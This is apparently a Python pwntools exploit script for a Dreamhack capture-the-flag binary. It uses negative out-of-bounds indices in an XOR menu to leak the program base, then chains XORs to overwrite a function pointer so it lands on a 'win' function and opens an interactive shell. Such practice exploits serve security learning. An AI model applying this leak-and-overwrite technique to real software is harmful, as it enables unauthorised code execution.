#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./main")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 15765)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    array = [
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
    ]

    def init():
        for i in range(len(array)):
            array[i] = 1 << i
            continue
        return

    def print_array():
        for i in range(len(array)):
            hex_output = hex(array[i])
            if i % 2 == 1:
                print(f"{i}{' ' * (3 - len(str(i)))}{hex_output}")
            if i % 2 == 0:
                print(
                    f"{i}{' ' * (3 - len(str(i)))}{hex_output}{' ' * (20 - len(hex_output))}",
                    end="",
                    flush=True,
                )
        return

    def xor(i: int, j: int):
        io.sendlineafter("> ", "1")
        io.sendlineafter("Enter i & j > ", str(i).encode())
        io.sendline(str(j).encode())
        return

    def print_(i: int) -> int:
        io.sendlineafter("> ", "2")
        io.sendlineafter("Enter i > ", str(i).encode())
        io.recvuntil("Value: ")
        leak = io.recvline().strip(b"\n")
        return int(leak, 16)

    def update_array():
        for i in range(len(array)):
            array[i] = print_(i)

    xor(0, -0x39)
    exe.base = (print_(0) ^ 1) - 0x3410

    win_func = unwrap(exe.symbol("win"))

    xor(3, -0x178 // 8)
    xor(3, 2)
    xor(3, 8)
    xor(3, 9)
    xor(3, 10)
    xor(3, 13)
    xor(3, 0)

    xor(1, -0x80 // 8)
    xor(1, -0x1C0 // 8)

    xor(1, 3)
    xor(-0x80 // 8, 1)

    io.interactive()

    # 0x5555555553ed = 0x555555557411 ^ 0x27fc
    #                = 0x555555557411 ^ 0x2000 ^ 0x7fc
    #                = 0x555555557411 ^ 0x2000 ^ 0x400 ^ 0x3fc
    #                = 0x555555557411 ^ 0x2000 ^ 0x400 ^ 0x200 ^ 0x1fc
    #                = 0x555555557411 ^ 0x2000 ^ 0x400 ^ 0x200 ^ 0x100 ^ 0xfc
    #                = 0x555555557411 ^ 0x2000 ^ 0x400 ^ 0x200 ^ 0x100 ^ 0x4 ^ 0xf8
    #                = 0x555555557411 ^ 0x2000 ^ 0x400 ^ 0x200 ^ 0x100 ^ 0x4 ^ 0x8 ^ 0xf0

    # 0x5555555553ed = printf ^ printf ^ 0x5555555553ed
    #                = printf ^ (printf ^ 0x2) ^ 0x5555555553ed ^ 0x2

    return


if __name__ == "__main__":
    main()
